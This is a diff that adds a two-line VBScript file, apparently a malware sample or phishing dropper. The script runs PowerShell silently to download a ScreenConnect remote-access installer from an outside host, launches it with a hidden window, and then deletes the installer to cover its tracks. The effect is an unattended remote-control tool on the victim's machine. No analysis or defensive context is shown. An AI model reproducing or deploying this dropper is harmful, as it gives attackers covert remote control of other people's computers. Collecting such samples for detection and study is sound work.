@@ -1,0 +1,2 @@
+' UniqueID: 0683_l4DiXA0R
+CreateObject("WScript.Shell").Run "powershell -Command ""$url='https://rmkclothingbrand.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=rmkclothingbrand&c=&c=&c=&c=&c=&c=&c='; $out='%temp%\ScreenConnect.ClientSetup.exe'; (New-Object Net.WebClient).DownloadFile($url,$out); Start-Process $out -WindowStyle Hidden; Start-Sleep 5; Remove-Item $out -Force""", 0, False
